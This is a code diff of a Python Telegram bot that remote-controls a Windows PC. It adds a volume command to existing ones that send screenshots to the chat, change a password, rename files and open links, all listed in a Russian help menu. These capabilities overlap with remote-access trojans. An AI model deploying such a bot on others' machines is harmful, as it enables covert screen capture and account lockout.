@@ -3,6 +3,9 @@ import os
 import winreg
 import pyautogui
 import webbrowser
+from pynput.keyboard import Key,Controller
+keyboard = Controller()
+import time
 
 
 class Bot:
@@ -23,8 +26,8 @@ class Bot:
     def refresh(self):
         pyautogui.keyDown('win')
         pyautogui.press('d')
-        pyautogui.press('f5')
         pyautogui.keyUp('win')
+        pyautogui.press('f5')
         pyautogui.keyDown('win')
         pyautogui.press('d')
         pyautogui.keyUp('win')
@@ -34,6 +37,17 @@ class Bot:
         pyautogui.screenshot(f'{dir_name}\\screen.png')
         bot.send_photo(message.chat.id, open(os.path.join(dir_name, 'screen.png'), 'rb'))
         os.remove(os.path.join(dir_name, 'screen.png'))
+        return True
+
+    def sound(self, arg):
+        arg = int(arg)
+        for i in range(abs(arg) // 2):
+            if arg < 0:
+                keyboard.press(Key.media_volume_down)
+                time.sleep(0.01)
+            else:
+                keyboard.press(Key.media_volume_up)
+                time.sleep(0.01)
         return True
 
     def rename(self, name):
@@ -71,7 +85,8 @@ class Bot:
                                                   "\n 5:отправь фото и оно сохранится на рабочий стол: *просто отправь фото*"
                                                   "\n 6:сменить пароль: repar"
                                                   "\n 7:снимок экрана: screen"
-                                                  "\n 8:открыть ссылку: open_webbr")
+                                                  "\n 8:открыть ссылку: open_webbr"
+                                                  "\n 9:изменить звук: sound")
                 return True
             if command[1][0] == 'rename_trash':
                 self.rename(command[1][1])
@@ -96,6 +111,8 @@ class Bot:
                 return self.screen(message)
             if command[1][0] == 'open_webbr':
                 return self.webbrowser(command[1][1])
+            if command[1][0] == 'sound':
+                return self.sound(command[1][1])
 
 bot_bot = Bot()
 bot = bot_bot.bot
